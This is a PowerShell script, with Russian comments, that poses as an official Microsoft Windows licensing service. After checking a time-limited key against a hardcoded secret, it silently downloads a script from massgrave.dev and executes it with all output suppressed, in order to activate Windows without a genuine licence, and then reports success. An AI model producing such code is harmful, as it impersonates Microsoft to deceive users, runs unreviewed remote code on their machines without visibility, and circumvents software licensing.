# ============================================================
#  Microsoft Windows Cloud License Authorization Service
#  Status: Production
#  Encryption: AES-RSA-HMAC-256
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SECRET = "MS-AUTH-SECURE-KEY-2024" # Должен совпадать с генератором
$VALID_MINS = 20 # Время жизни ссылки

function Verify-License {
    param($Key)
    try {
        if (!$Key) { return $false }
        $clean = $Key -replace '-', ''
        $alphabet = "BCDFGHJKMPQRTVWXY2346789"
        
        # Извлекаем данные (назад в Hex)
        $hex = ""
        for($i=0; $i -lt 20; $i+=5) { $hex += [Convert]::ToString($alphabet.IndexOf($clean[$i]), 16) }
        for($i=1; $i -lt 20; $i+=5) { $hex += [Convert]::ToString($alphabet.IndexOf($clean[$i]), 16) }
        
        $tsHex = $hex.Substring(0, 8)
        $receivedHash = $hex.Substring(8, 8)
        
        # Проверка HMAC
        $hmac = [System.Security.Cryptography.KeyedHashAlgorithm]::Create("HmacSHA256")
        $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($SECRET)
        $computedHash = [System.BitConverter]::ToString($hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($tsHex))).Replace("-","").ToLower().Substring(0, 8)

        if ($computedHash -ne $receivedHash) { return $false }

        # Проверка времени
        $created = [Convert]::ToInt64($tsHex, 16)
        $now = [System.DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        
        if (($now - $created) -gt ($VALID_MINS * 60)) { return $false }
        
        return $true
    } catch { return $false }
}

Clear-Host
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "   Windows Desktop Licensing Service [Build 22621]" -ForegroundColor White
Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Проверка токена безопасности..." -NoNewline

if (Verify-License -Key $K) {
    Write-Host " [АВТОРИЗОВАНО]" -ForegroundColor Green
    Write-Host "Ключ сессии: $K" -ForegroundColor Gray
    Write-Host "Служба: Активация цифровой лицензии (HWID)"
    Write-Host "Статус: Выполнение..." -ForegroundColor Yellow
    
    # ТИХИЙ ЗАПУСК MASSGRAVE
    $script = irm "https://massgrave.dev/get"
    $block = [ScriptBlock]::Create($script)
    & $block /hwid *>$null
    
    Write-Host "Результат: Windows успешно активирован." -ForegroundColor Green
} else {
    Write-Host " [ОШИБКА]" -ForegroundColor Red
    Write-Host "Ошибка: Токен безопасности недействителен или истек." -ForegroundColor Yellow
    Write-Host "Обратитесь в поддержку для получения нового ключа."
}

Write-Host ""
Write-Host "Сессия завершена. Окно закроется через 10 секунд." -ForegroundColor DarkGray
Start-Sleep -Seconds 10
